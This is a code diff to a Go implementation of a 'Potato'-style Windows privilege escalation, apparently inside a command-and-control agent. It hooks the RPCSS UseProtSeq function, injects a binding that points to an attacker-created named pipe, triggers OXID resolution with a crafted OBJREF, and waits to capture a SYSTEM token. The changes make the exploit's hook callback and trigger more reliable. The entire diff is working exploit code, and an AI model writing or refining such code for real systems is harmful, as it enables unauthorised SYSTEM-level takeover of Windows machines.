@@ -69,6 +69,9 @@ type potatoState struct {
 	origFuncPtr    uintptr
 	hookCalled     bool
 	paramCount     int
+	// Pre-computed DUALSTRINGARRAY bytes (built before hook install to avoid
+	// fmt.Sprintf/allocations inside the RPC dispatch callback context)
+	precomputedDSA []byte
 }
 
 var potatoGlobal potatoState
@@ -132,66 +135,76 @@ func readUseProtSeqParamCount(midlInfo *midlServerInfo) (int, error) {
 	return paramCount, nil
 }
 
-// handleUseProtSeq is the core hook handler. It allocates a DUALSTRINGARRAY
-// containing an ncacn_np binding that points to our named pipe, then writes
-// the pointer into the ppdsaNewBindings output parameter (pointer-to-pointer).
-// This matches GodPotato's approach: text-based binding strings, HeapAlloc'd memory.
+// buildPipeDSA pre-computes the DUALSTRINGARRAY bytes for the hook callback.
+// This is called during setup (before hook install) so the callback itself
+// does only minimal work: HeapAlloc + memcpy + pointer write.
+func buildPipeDSA(pipeUniqueName string) []byte {
+	endpoints := []string{
+		"ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`,
+		"ncacn_ip_tcp:127.0.0.1",
+	}
+
+	// Calculate entry count (in uint16 units)
+	entriesCount := 3 // double-null end + empty sec binding + null
+	for _, ep := range endpoints {
+		entriesCount += len(ep) + 1
+	}
+
+	bufSize := entriesCount*2 + 10
+	buf := make([]byte, bufSize) // zero-filled
+
+	offset := 0
+	// wNumEntries
+	binary.LittleEndian.PutUint16(buf[offset:], uint16(entriesCount))
+	offset += 2
+	// wSecurityOffset
+	binary.LittleEndian.PutUint16(buf[offset:], uint16(entriesCount-2))
+	offset += 2
+	// Write each endpoint as UTF-16LE characters
+	for _, ep := range endpoints {
+		for _, ch := range ep {
+			binary.LittleEndian.PutUint16(buf[offset:], uint16(ch))
+			offset += 2
+		}
+		offset += 2 // null terminator (already zero)
+	}
+
+	return buf[:4+entriesCount*2]
+}
+
+// handleUseProtSeq is the core hook handler called from the RPC dispatch context.
+// It does ONLY minimal work: HeapAlloc, memcpy from pre-computed buffer, pointer write.
+// No Go allocations, no fmt, no mutex — safe for RPC callback context.
 func handleUseProtSeq(ppdsaNewBindings uintptr) uintptr {
 	if ppdsaNewBindings == 0 {
 		return 0
 	}
 
-	name := potatoGlobal.pipeUniqueName
-	endpoints := []string{
-		fmt.Sprintf(`ncacn_np:localhost/pipe/%s[\pipe\epmapper]`, name),
-		"ncacn_ip_tcp:127.0.0.1",
+	src := potatoGlobal.precomputedDSA
+	srcLen := len(src)
+	if srcLen == 0 {
+		return 0
 	}
 
-	// Calculate entry count (in uint16 units)
-	// Each endpoint: len(chars) + 1 (null terminator)
-	// Plus: 1 (double-null end of strings) + 2 (empty security binding + null)
-	entriesCount := 3
-	for _, ep := range endpoints {
-		entriesCount += len(ep) + 1
-	}
-
-	bufferSize := entriesCount*2 + 10 // bytes, with padding
-
-	// Allocate memory from process heap (HEAP_ZERO_MEMORY = 0x08)
+	// Allocate from process heap (HEAP_ZERO_MEMORY = 0x08)
 	hHeap, _, _ := procGetProcessHeap.Call()
 	if hHeap == 0 {
 		return 0
 	}
-	buf, _, _ := procHeapAlloc.Call(hHeap, 0x08, uintptr(bufferSize))
+	buf, _, _ := procHeapAlloc.Call(hHeap, 0x08, uintptr(srcLen))
 	if buf == 0 {
 		return 0
 	}
 
-	// Write DUALSTRINGARRAY header
-	offset := uintptr(0)
-	// wNumEntries
-	*(*uint16)(unsafe.Pointer(buf + offset)) = uint16(entriesCount)
-	offset += 2
-	// wSecurityOffset (offset to security section)
-	*(*uint16)(unsafe.Pointer(buf + offset)) = uint16(entriesCount - 2)
-	offset += 2
+	// Copy pre-computed DUALSTRINGARRAY
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf)), srcLen)
+	copy(dst, src)
 
-	// Write each endpoint as UTF-16LE characters
-	for _, ep := range endpoints {
-		for _, ch := range ep {
-			*(*uint16)(unsafe.Pointer(buf + offset)) = uint16(ch)
-			offset += 2
-		}
-		offset += 2 // null terminator (buffer is zeroed)
-	}
-
-	// Write the pointer to *ppdsaNewBindings (it's a DUALSTRINGARRAY**)
+	// Write pointer to *ppdsaNewBindings (DUALSTRINGARRAY**)
 	*(*uintptr)(unsafe.Pointer(ppdsaNewBindings)) = buf
 
-	// Signal that the hook was called (diagnostic)
-	potatoGlobal.mu.Lock()
+	// Set flag without mutex (atomic store is safe enough for a bool diagnostic)
 	potatoGlobal.hookCalled = true
-	potatoGlobal.mu.Unlock()
 
 	return 0 // RPC_S_OK
 }
@@ -340,6 +353,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	potatoGlobal.tokenCaptured = false
 	potatoGlobal.systemToken = 0
 	potatoGlobal.hookCalled = false
+	potatoGlobal.precomputedDSA = buildPipeDSA(pipeUniqueName)
 
 	// Create the pipe with permissive DACL
 	sd, sdErr := windows.NewSecurityDescriptor()
@@ -423,8 +437,21 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
 	}()
 
-	// Phase 6: Trigger OXID resolution via crafted OBJREF
-	triggerErr := triggerOXIDResolution(oxid, oid, ipid)
+	// Phase 6: Trigger OXID resolution via crafted OBJREF.
+	// Run in a goroutine because CoUnmarshalInterface can block if RPCSS hangs.
+	triggerDone := make(chan error, 1)
+	go func() {
+		triggerDone <- triggerOXIDResolution(oxid, oid, ipid)
+	}()
+
+	// Wait for trigger to complete (5s) or proceed to pipe wait
+	var triggerErr error
+	select {
+	case triggerErr = <-triggerDone:
+		// trigger completed
+	case <-time.After(5 * time.Second):
+		triggerErr = fmt.Errorf("CoUnmarshalInterface blocked for >5s")
+	}
 
 	// Phase 7: Wait for pipe connection (SYSTEM connecting)
 	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
@@ -433,9 +460,11 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 		if potatoGlobal.hookCalled {
 			hookStatus = "called"
 		}
-		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s\nHook was %s (paramCount=%d)", pipeName, hookStatus, paramCount)
+		bindingStr := "ncacn_np:localhost/pipe/" + pipeUniqueName + `[\pipe\epmapper]`
+		errMsg := fmt.Sprintf("RPCSS did not connect to pipe within timeout.\nPipe: %s\nBinding: %s\nHook was %s (paramCount=%d)\nDSA size: %d bytes",
+			pipeName, bindingStr, hookStatus, paramCount, len(potatoGlobal.precomputedDSA))
 		if triggerErr != nil {
-			errMsg += fmt.Sprintf("\nTrigger error: %v", triggerErr)
+			errMsg += fmt.Sprintf("\nTrigger: %v", triggerErr)
 		}
 		return structs.CommandResult{
 			Output:    errMsg,
